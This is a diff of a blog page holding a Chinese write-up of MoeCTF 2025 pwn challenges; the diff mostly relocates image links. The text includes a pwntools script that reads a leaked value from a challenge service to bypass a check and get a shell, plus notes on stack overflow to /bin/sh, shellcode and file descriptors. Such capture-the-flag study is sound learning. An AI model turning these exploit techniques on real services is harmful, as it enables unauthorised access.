@@ -21,70 +21,70 @@
   <meta name="author" content="bsahfm">
   <meta name="keywords" content="">
   
-    <meta name="description" content="1.p64，u64     通过代码审计已知：  程序打印出：：num的值 输入num判断相等即可跳过if获取权限  2.构造payload  12345678910from pwn import *  # 导入 pwn 工具库，提供远程连接、数据收发等功能 # r &#x3D; process(&#x27;.&#x2F;pwn&#x27;)  # 本地调试时使用，启动本地程序（注释掉了）r &#x3D; remote(&amp;#x">
+    <meta name="description" content="1.p64，u64       通过代码审计已知：  程序打印出：：num的值 输入num判断相等即可跳过if获取权限  2.构造payload   12345678910from pwn import *  # 导入 pwn 工具库，提供远程连接、数据收发等功能 # r &#x3D; process(&#x27;.&#x2F;pwn&#x27;)  # 本地调试时使用，启动本地程序（注释掉了）r &#x3D; remote(">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2025moectf">
 <meta property="og:url" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/index.html">
 <meta property="og:site_name" content="bsahfm">
-<meta property="og:description" content="1.p64，u64     通过代码审计已知：  程序打印出：：num的值 输入num判断相等即可跳过if获取权限  2.构造payload  12345678910from pwn import *  # 导入 pwn 工具库，提供远程连接、数据收发等功能 # r &#x3D; process(&#x27;.&#x2F;pwn&#x27;)  # 本地调试时使用，启动本地程序（注释掉了）r &#x3D; remote(&amp;#x">
+<meta property="og:description" content="1.p64，u64       通过代码审计已知：  程序打印出：：num的值 输入num判断相等即可跳过if获取权限  2.构造payload   12345678910from pwn import *  # 导入 pwn 工具库，提供远程连接、数据收发等功能 # r &#x3D; process(&#x27;.&#x2F;pwn&#x27;)  # 本地调试时使用，启动本地程序（注释掉了）r &#x3D; remote(">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755485942753-fb938404-4d1e-43cd-860a-ed45f807f4a4.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755485963646-80372354-045a-4065-a11d-da9a62cc7544.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755486325470-739a0a7d-7345-445f-84a7-43e87de023c0.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755488061434-6c2d9c37-702c-44a9-8342-d6508770d4b0.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755488075224-8eec3a6a-8b78-43c2-9677-12c2c1a0cc4f.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755488160685-3bf49427-1bd1-4953-b3a3-b45dd518d22f.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755488249108-2ae25103-5717-44f8-90fe-6b56997eaa43.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755499813786-e2811a92-8eb4-426e-a77c-9452d29ad06f.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755510070847-14486dee-62a1-43ba-ad66-45422dcf97fe.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755509223757-fd1a11ea-1f65-49d3-a619-277d6af0878d.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755510204606-fce0dc67-7f77-4195-9d28-1678343f33fc.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755510402539-aa39bcfc-9617-4751-b89b-17bca8aa4008.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755510421703-e846ee8e-4061-46f8-84bd-96e694ebaf28.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755841216905-736ccc36-86ae-450b-a3d5-93e2c7d5e2b1.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755841089670-9cfb1eb6-8ba0-4590-942e-3a41ee1421dc.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755841108125-bb3bccd9-4e8e-4ab4-883c-da81ff4ca7c1.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755841558005-fe2dcf43-cbea-4c15-a68f-ee5ff5c040fe.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755916971671-b9393331-9311-4ed8-aa10-fcd2d920babe.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755916984235-aef77fb6-2a3c-4077-810c-4c7b2c03c49f.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755916998040-57c93a37-314a-4287-be61-2861f7f74f50.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755918310961-1b070c98-1c13-4f77-a741-e005bd08fdef.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755932572940-6a2b1f03-b49f-47f6-9392-0d54a467343d.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755933058076-c8d23592-628e-4030-8e3f-910adcb23978.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755932505506-d0e5b3ff-12a6-49f2-b78e-221df40da0fa.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755938559444-7f4bda61-43d6-471a-87fa-f28b93ead6c4.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755938576026-7c5eb861-754b-45a9-8ffa-0d44ea0fcc8d.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755938589065-bcc3423c-14fd-4a70-bbe3-dc8233829798.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755939144929-0ed2654e-e2f5-4f07-b3b0-2c356ff8ae19.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755948461570-f21ed1e5-3175-421c-ad28-d0967594823d.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1756099790897-46d29d19-8bde-4230-86fc-aa4b93e5b3e8.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1756100042367-d31abaeb-4a1d-4814-bffa-837b5aaf8622.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1756099815672-4c2b5314-395b-4de7-b9a4-5bd6bc1c1062.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1756114366008-3c885c6d-0997-4936-9cdd-637b582ff9b4.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1756114389828-c01c4f41-8e16-4fb4-b02c-cee58519adf8.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1756114403864-91e3ed0c-1e8d-461b-9f9f-f33d4cb7c314.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1756114415797-3549688b-91dc-4e13-a231-ffc69cfe06fc.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1756114547934-b8b51370-b08f-407c-adce-2f8b59142f3c.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1756296023692-60e92638-abdb-4a7e-ab39-f8faf20cceed.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1756296042610-0f26d909-0761-44e7-a16b-9db382e7cf3e.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1757314877348-19acf572-0250-4956-aeaf-14c06849ace2.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1757314975527-3bf051aa-fae0-450a-a363-dd62e2304c06.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1757496484180-60c91d3e-661a-4569-bd91-f9d77fcb08de.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1757496506081-e7a80235-e2aa-4978-8d79-aca034f3e092.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1763979891565-f285d2a9-4dc1-4039-a43f-e0f0dd7c8aa2.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1763979961354-afa0332c-af26-40a0-a323-87e9772bd822.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1763980445608-5f931a7a-e95b-489b-81d5-4dbd7eb5d259.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1764224103693-a730992b-0a3b-49d5-b286-08a1285aa8db.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1764224127518-62404130-720d-4671-b1b2-1afccc8aa452.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1764224490898-1455aa48-8ced-4840-b491-dbe16bfd17ec.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1765294776008-3a91c5b0-78e1-401a-9115-de775c408de9.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1765328699218-095f52d3-cef3-4efb-beb6-0d889cdb00f3.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1765328814155-6a5365a2-f720-4c8a-a17e-8773fc1cde59.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755485942753-fb938404-4d1e-43cd-860a-ed45f807f4a4.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755485963646-80372354-045a-4065-a11d-da9a62cc7544.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755486325470-739a0a7d-7345-445f-84a7-43e87de023c0.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755488061434-6c2d9c37-702c-44a9-8342-d6508770d4b0.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755488075224-8eec3a6a-8b78-43c2-9677-12c2c1a0cc4f.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755488160685-3bf49427-1bd1-4953-b3a3-b45dd518d22f.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755488249108-2ae25103-5717-44f8-90fe-6b56997eaa43.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755499813786-e2811a92-8eb4-426e-a77c-9452d29ad06f.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755510070847-14486dee-62a1-43ba-ad66-45422dcf97fe.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755509223757-fd1a11ea-1f65-49d3-a619-277d6af0878d.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755510204606-fce0dc67-7f77-4195-9d28-1678343f33fc.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755510402539-aa39bcfc-9617-4751-b89b-17bca8aa4008.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755510421703-e846ee8e-4061-46f8-84bd-96e694ebaf28.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755841216905-736ccc36-86ae-450b-a3d5-93e2c7d5e2b1.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755841089670-9cfb1eb6-8ba0-4590-942e-3a41ee1421dc.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755841108125-bb3bccd9-4e8e-4ab4-883c-da81ff4ca7c1.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755841558005-fe2dcf43-cbea-4c15-a68f-ee5ff5c040fe.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755916971671-b9393331-9311-4ed8-aa10-fcd2d920babe.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755916984235-aef77fb6-2a3c-4077-810c-4c7b2c03c49f.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755916998040-57c93a37-314a-4287-be61-2861f7f74f50.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755918310961-1b070c98-1c13-4f77-a741-e005bd08fdef.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755932572940-6a2b1f03-b49f-47f6-9392-0d54a467343d.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755933058076-c8d23592-628e-4030-8e3f-910adcb23978.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755932505506-d0e5b3ff-12a6-49f2-b78e-221df40da0fa.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755938559444-7f4bda61-43d6-471a-87fa-f28b93ead6c4.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755938576026-7c5eb861-754b-45a9-8ffa-0d44ea0fcc8d.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755938589065-bcc3423c-14fd-4a70-bbe3-dc8233829798.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755939144929-0ed2654e-e2f5-4f07-b3b0-2c356ff8ae19.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755948461570-f21ed1e5-3175-421c-ad28-d0967594823d.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1756099790897-46d29d19-8bde-4230-86fc-aa4b93e5b3e8.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1756100042367-d31abaeb-4a1d-4814-bffa-837b5aaf8622.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1756099815672-4c2b5314-395b-4de7-b9a4-5bd6bc1c1062.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1756114366008-3c885c6d-0997-4936-9cdd-637b582ff9b4.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1756114389828-c01c4f41-8e16-4fb4-b02c-cee58519adf8.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1756114403864-91e3ed0c-1e8d-461b-9f9f-f33d4cb7c314.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1756114415797-3549688b-91dc-4e13-a231-ffc69cfe06fc.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1756114547934-b8b51370-b08f-407c-adce-2f8b59142f3c.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1756296023692-60e92638-abdb-4a7e-ab39-f8faf20cceed.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1756296042610-0f26d909-0761-44e7-a16b-9db382e7cf3e.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1757314877348-19acf572-0250-4956-aeaf-14c06849ace2.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1757314975527-3bf051aa-fae0-450a-a363-dd62e2304c06.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1757496484180-60c91d3e-661a-4569-bd91-f9d77fcb08de.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1757496506081-e7a80235-e2aa-4978-8d79-aca034f3e092.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1763979891565-f285d2a9-4dc1-4039-a43f-e0f0dd7c8aa2.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1763979961354-afa0332c-af26-40a0-a323-87e9772bd822.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1763980445608-5f931a7a-e95b-489b-81d5-4dbd7eb5d259.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1764224103693-a730992b-0a3b-49d5-b286-08a1285aa8db.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1764224127518-62404130-720d-4671-b1b2-1afccc8aa452.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1764224490898-1455aa48-8ced-4840-b491-dbe16bfd17ec.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1765294776008-3a91c5b0-78e1-401a-9115-de775c408de9.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1765328699218-095f52d3-cef3-4efb-beb6-0d889cdb00f3.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1765328814155-6a5365a2-f720-4c8a-a17e-8773fc1cde59.png">
 <meta property="article:published_time" content="2026-07-21T14:38:21.000Z">
-<meta property="article:modified_time" content="2026-07-21T15:09:14.290Z">
+<meta property="article:modified_time" content="2026-07-21T15:45:31.489Z">
 <meta property="article:author" content="bsahfm">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755485942753-fb938404-4d1e-43cd-860a-ed45f807f4a4.png">
+<meta name="twitter:image" content="https://yy-t1.github.io/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755485942753-fb938404-4d1e-43cd-860a-ed45f807f4a4.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -359,22 +359,27 @@
                 <h1 id="1-p64，u64"><a href="#1-p64，u64" class="headerlink" title="1.p64，u64"></a>1.p64，u64</h1><ol>
 <li></li>
 </ol>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755485942753-fb938404-4d1e-43cd-860a-ed45f807f4a4.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755485963646-80372354-045a-4065-a11d-da9a62cc7544.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755485942753-fb938404-4d1e-43cd-860a-ed45f807f4a4.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755485963646-80372354-045a-4065-a11d-da9a62cc7544.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>通过代码审计已知：</p>
 <ul>
 <li>程序打印出：：num的值</li>
 <li>输入num判断相等即可跳过if获取权限</li>
 </ul>
 <p>2.构造payload</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755486325470-739a0a7d-7345-445f-84a7-43e87de023c0.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755486325470-739a0a7d-7345-445f-84a7-43e87de023c0.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">from pwn import *  # 导入 pwn 工具库，提供远程连接、数据收发等功能<br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">r = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)  <span class="hljs-comment"># 本地调试时使用，启动本地程序（注释掉了）</span></span><br>r = remote(&#x27;192.168.136.1&#x27;, 60135)  # 连接远程服务，IP 为 192.168.136.1，端口为 60135<br> <br>r.recvuntil(&quot;the hint.&quot;)  # 接收数据，直到遇到字符串 &quot;the hint.&quot; 为止<br>data = r.recv(8)  # 继续接收 8 字节的数据（可能是提示的后续内容或关键数值）<br>num = u64(data)   # 将接收的 8 字节数据解释为无符号 64 位整数（小端序）<br>r.sendline(str(num).encode())  # 将数值转换为字符串并编码为字节，发送给远程服务<br>r.interactive()  # 进入交互模式，允许用户手动输入命令<br></code></pre></td></tr></table></figure>
 
 <h1 id="2-栈溢出"><a href="#2-栈溢出" class="headerlink" title="2.栈溢出"></a>2.栈溢出</h1><ol>
 <li></li>
 </ol>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755488061434-6c2d9c37-702c-44a9-8342-d6508770d4b0.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755488075224-8eec3a6a-8b78-43c2-9677-12c2c1a0cc4f.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755488061434-6c2d9c37-702c-44a9-8342-d6508770d4b0.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755488075224-8eec3a6a-8b78-43c2-9677-12c2c1a0cc4f.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>代码审计已知：</p>
 <ul>
 <li>用户输入n7代表buf读取的值</li>
@@ -382,11 +387,13 @@
 <li>read存在栈溢出</li>
 </ul>
 <p>shift f12</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755488160685-3bf49427-1bd1-4953-b3a3-b45dd518d22f.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755488160685-3bf49427-1bd1-4953-b3a3-b45dd518d22f.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>找到bin&#x2F;sh</p>
 <p>找到其地址复制</p>
 <p>2.构造payload</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755488249108-2ae25103-5717-44f8-90fe-6b56997eaa43.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755488249108-2ae25103-5717-44f8-90fe-6b56997eaa43.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>用户需要先输入str（50）表示n7进而限制buf读取的数据</p>
 <p>再在read读取buf时进行栈溢出获取shell</p>
 <h1 id="3-shellcode"><a href="#3-shellcode" class="headerlink" title="3.shellcode"></a>3.shellcode</h1><ol>
@@ -406,7 +413,8 @@
 <li>直接传入我们需要执行的shellcode</li>
 </ol>
 <p>3.构造payload</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755499813786-e2811a92-8eb4-426e-a77c-9452d29ad06f.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755499813786-e2811a92-8eb4-426e-a77c-9452d29ad06f.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <h1 id="4-fd文件描述符"><a href="#4-fd文件描述符" class="headerlink" title="4.fd文件描述符"></a>4.fd文件描述符</h1><p><strong>前言：</strong></p>
 <p>文件描述符（fd）详解</p>
 <p>文件描述符是Unix&#x2F;Linux系统中用于访问I&#x2F;O资源的整数句柄，每个进程都有一个文件描述符表，用于跟踪打开的文件和I&#x2F;O流。关键特性：</p>
@@ -435,15 +443,21 @@
 </li>
 <li><p>如 <code>**dup(1)**</code> 通常返回3（假设0,1,2已打开）</p>
 </li>
-<li><p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755510070847-14486dee-62a1-43ba-ad66-45422dcf97fe.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-</li>
+<li><img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755510070847-14486dee-62a1-43ba-ad66-45422dcf97fe.png" srcset="/img/loading.gif" lazyload class="" title="img"></li>
 </ul>
 <p>1.<strong>依旧代码审计</strong></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755509223757-fd1a11ea-1f65-49d3-a619-277d6af0878d.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755509223757-fd1a11ea-1f65-49d3-a619-277d6af0878d.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>已知：</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755510204606-fce0dc67-7f77-4195-9d28-1678343f33fc.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755510204606-fce0dc67-7f77-4195-9d28-1678343f33fc.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+
+
 <p>2.分析输入</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755510402539-aa39bcfc-9617-4751-b89b-17bca8aa4008.png" srcset="/img/loading.gif" lazyload alt="img"><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755510421703-e846ee8e-4061-46f8-84bd-96e694ebaf28.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755510402539-aa39bcfc-9617-4751-b89b-17bca8aa4008.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755510421703-e846ee8e-4061-46f8-84bd-96e694ebaf28.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>3.个人理解</p>
 <p>fd就是进程的编号，其中0代表输入，1代表输出，2代表终止</p>
 <p>通过fd&#x3D;dup(1)将输出复制给fd进程，此时0，1，2均占满，所以fd为3并且代表用来输出的进程</p>
@@ -454,10 +468,13 @@
 <ol>
 <li></li>
 </ol>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755841216905-736ccc36-86ae-450b-a3d5-93e2c7d5e2b1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755841216905-736ccc36-86ae-450b-a3d5-93e2c7d5e2b1.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <p>给了两个文件，动态链接库已给</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755841089670-9cfb1eb6-8ba0-4590-942e-3a41ee1421dc.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/55172864/1755841108125-bb3bccd9-4e8e-4ab4-883c-da81ff4ca7c1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755841089670-9cfb1eb6-8ba0-4590-942e-3a41ee1421dc.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
+<img src="/2026/07/21/pwn/%E6%AF%94%E8%B5%9B/2025moectf/1755841108125-bb3bccd9-4e8e-4ab4-883c-da81ff4ca7c1.png" srcset="/img/loading.gif" lazyload class="" title="img">
+
 <ol start="2">
 <li></li>
 </ol>
